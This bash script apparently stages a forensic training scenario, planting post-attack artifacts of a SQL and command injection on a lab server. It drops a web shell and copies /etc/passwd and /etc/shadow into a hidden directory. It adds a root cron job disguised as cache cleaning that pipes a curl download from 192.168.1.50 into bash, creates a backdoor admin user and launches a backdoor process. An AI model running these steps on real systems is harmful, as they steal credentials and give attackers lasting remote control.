#!/bin/bash
# Plant post-attack artifacts for SQL injection + command injection scenario on server_1
# Attacker: 10.0.4.6 (server_6) → SQL injection on index.php → cmd injection via shell.php → web shell

# --- Auth log (baseline cron sessions) ---
cat /opt/artifacts/auth.log >> /var/log/auth.log

# --- Nginx log artifacts ---
cat /opt/artifacts/nginx_access.log >> /var/log/nginx/access.log
cat /opt/artifacts/nginx_error.log >> /var/log/nginx/error.log

# --- Dropped web shell ---
cp /opt/artifacts/cmd.php /var/www/html/cmd.php

# --- Fake attacker PHP session ---
echo "attacker_session|s:5:\"admin\";role|s:5:\"admin\";" > /tmp/sess_attacker_session_id

# --- Exfiltrated credential files ---
mkdir -p /tmp/.www_cache
cp /etc/passwd /tmp/.www_cache/passwd_dump
cat /etc/shadow > /tmp/.www_cache/shadow_dump 2>/dev/null || echo "root:*:19394:0:99999:7:::" > /tmp/.www_cache/shadow_dump

# --- Persistence: cron job for C2 beacon every 15 minutes ---
cat > /etc/cron.d/.nginx_cache_clean << 'CRON'
*/15 * * * * root curl -s http://192.168.1.50:8443/beacon | bash >/dev/null 2>&1
CRON
chmod 644 /etc/cron.d/.nginx_cache_clean

# --- Insert backdoor admin user into SQLite DB (after init_db.php has run) ---
(
  sleep 3
  sqlite3 /var/www/html/portal.db "INSERT INTO users (username, password, role) VALUES ('backdoor', 'hacked', 'admin');" 2>/dev/null || true
) &

# --- Start disguised backdoor process ---
nohup /opt/artifacts/backdoor.sh >/dev/null 2>&1 &
